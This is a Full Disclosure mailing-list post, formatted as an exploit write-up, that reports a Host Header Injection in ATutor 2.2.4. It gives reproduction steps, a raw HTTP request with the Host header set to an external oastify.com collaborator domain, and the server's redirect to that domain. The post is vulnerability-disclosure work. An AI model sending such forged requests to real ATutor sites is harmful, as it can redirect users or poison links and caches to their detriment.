---
title: Host Header Injection - atutorv2.2.4
url: https://seclists.org/fulldisclosure/2025/Jan/9
source: Full Disclosure
date: 2025-01-29
fetch_date: 2025-10-06T20:11:59.477293
---

# Host Header Injection - atutorv2.2.4

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# Host Header Injection - atutorv2.2.4

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Tue, 21 Jan 2025 17:30:09 +0000

---

```
# Exploit Title: Host Header Injection - atutorv2.2.4
# Date: 01/2025
# Exploit Author: Andrey Stoykov
# Version: 2.2.4
# Tested on: Ubuntu 22.04
# Blog:
https://msecureltd.blogspot.com/2025/01/friday-fun-pentest-series-18-host.html

Description:

- It was found that the application had a Host Header Injection
vulnerability.

Host Header Injection #1:

Steps to Reproduce:

1. Visit specific page of the application
2. Intercept the HTTP GET/POST request
3. Modify the Host header to a domain of attackers choice
4. Forward the HTTP request

// HTTP GET request

GET /atutor/bounce.php?course=0 HTTP/1.1
Host: yz13ej73z3j9dnnv3rt0yxqeg5mwauyj.oastify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0)
Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.1.110/atutor/login.php
Connection: keep-alive
Cookie: ATutorID=oukcasgb86k60mefasc36joje4; flash=no
Upgrade-Insecure-Requests: 1
Priority: u=0, i

// HTTP response

HTTP/1.1 302 Found
Date: Thu, 09 Jan 2025 18:55:35 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Set-Cookie: ATutorID=nl8ahpeo2tsd0mc4d2a0br4a94; path=/atutor/; HttpOnly
Set-Cookie: ATutorID=nl8ahpeo2tsd0mc4d2a0br4a94; path=/atutor/; HttpOnly
Set-Cookie: flash=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0
Set-Cookie: nexthelp_cookie=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT;
Max-Age=0; path=/
Location:
http://yz13ej73z3j9dnnv3rt0yxqeg5mwauyj.oastify.com/atutor/login.php
Vary: Accept-Encoding
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

### Current thread:

* **Host Header Injection - atutorv2.2.4** *Andrey Stoykov (Jan 27)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")